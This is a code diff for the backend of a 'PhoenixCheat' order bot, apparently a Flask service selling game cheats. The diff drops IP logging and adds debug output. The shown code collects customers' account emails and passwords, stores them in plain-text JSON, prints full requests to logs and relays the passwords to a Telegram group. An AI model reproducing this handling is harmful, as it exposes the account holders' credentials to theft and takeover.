@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# PhoenixCheat Bot V9 - Final Stable Backend
+# PhoenixCheat Bot V10 - Final Stable (No IP, Full Debug)
 
 import json
 import os
@@ -72,7 +72,8 @@ def load_data():
     try:
         with open(DB_PATH, "r", encoding="utf-8") as f:
             return json.load(f)
-    except:
+    except Exception as e:
+        print(f"⚠️ DB Load Error: {e} - Creating default.")
         save_data(DEFAULT_DATA)
         return DEFAULT_DATA
 
@@ -81,7 +82,9 @@ def save_data(data):
         with open(DB_PATH, "w", encoding="utf-8") as f:
             json.dump(data, f, ensure_ascii=False, indent=2)
         return True
-    except: return False
+    except Exception as e:
+        print(f"❌ DB Save Error: {e}")
+        return False
 
 def make_code(prefix="ORD"):
     rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
@@ -110,17 +113,13 @@ def check_coupon():
             return jsonify({"success": True, "discount": c["discount"]})
     return jsonify({"success": False, "message": "کد نامعتبر است"}), 400
 
-# تابع کمکی برای دریافت آی پی واقعی کاربر در Render
-def get_user_ip():
-    if request.headers.get('X-Forwarded-For'):
-        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
-    return request.remote_addr or "Unknown"
-
 # ثبت سفارش جدید
 @app_web.route("/register", methods=["POST"])
 def register():
     try:
         data = request.get_json()
+        print(f"📥 [DEBUG] New Order Request: {data}") # لاگ برای دیباگ
+        
         db = load_data()
         
         # بررسی کد تخفیف
@@ -137,7 +136,6 @@ def register():
             "id": oid,
             "code": make_code("ORD"),
             "date": datetime.now().strftime("%Y-%m-%d %H:%M"),
-            "ip": get_user_ip(), # دریافت از هدر Render
             "email": data.get("email", ""),
             "pass": data.get("pass", ""),
             "rubika": data.get("rubika", ""),
@@ -156,12 +154,17 @@ def register():
         db["orders"].append(order)
         db["next_order_id"] = oid + 1
         db["stats"]["total_orders"] = db["stats"].get("total_orders", 0) + 1
-        save_data(db)
-
-        threading.Thread(target=send_order_to_telegram, args=(order,), daemon=True).start()
-        return jsonify({"success": True, "code": order["code"]})
+        
+        if save_data(db):
+            print(f"✅ [DEBUG] Order {oid} saved to DB.")
+            threading.Thread(target=send_order_to_telegram, args=(order,), daemon=True).start()
+            return jsonify({"success": True, "code": order["code"]})
+        else:
+            print("❌ [DEBUG] Failed to save order to DB.")
+            return jsonify({"success": False, "message": "خطا در ذخیره‌سازی"}), 500
+            
     except Exception as e:
-        print(f"Register error: {e}")
+        print(f"❌ [DEBUG] Register error: {e}")
         return jsonify({"success": False, "message": "خطای داخلی سرور"}), 500
 
 # ================= ارسال به تلگرام =================
@@ -170,7 +173,9 @@ def send_order_to_telegram(order):
     if bot_app is None: return
     db = load_data()
     group_id = db.get("settings", {}).get("group_id")
-    if not group_id: return
+    if not group_id: 
+        print("❌ [DEBUG] Group ID not set.")
+        return
 
     try:
         import asyncio
@@ -180,8 +185,7 @@ def send_order_to_telegram(order):
         text = (
             f"🛒 **سفارش جدید ثبت شد!**\n\n"
             f"🔢 کد رهگیری: `{order['code']}`\n"
-            f"📅 زمان: {order['date']}\n"
-            f"🌐 آی‌پی: `{order['ip']}`\n\n"
+            f"📅 زمان: {order['date']}\n\n"
             f"👤 **اطلاعات اکانت:**\n"
             f"📧 ایمیل: {order['email']}\n"
             f"🔑 رمز: {order['pass']}\n"
@@ -212,8 +216,9 @@ def send_order_to_telegram(order):
             reply_markup=InlineKeyboardMarkup(keyboard)
         ))
         loop.close()
+        print("✅ [DEBUG] Order sent to Telegram successfully.")
     except Exception as e:
-        print(f"❌ Send error: {e}")
+        print(f"❌ [DEBUG] Telegram Send error: {e}")
 
 # ================= پنل ادمین =================
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
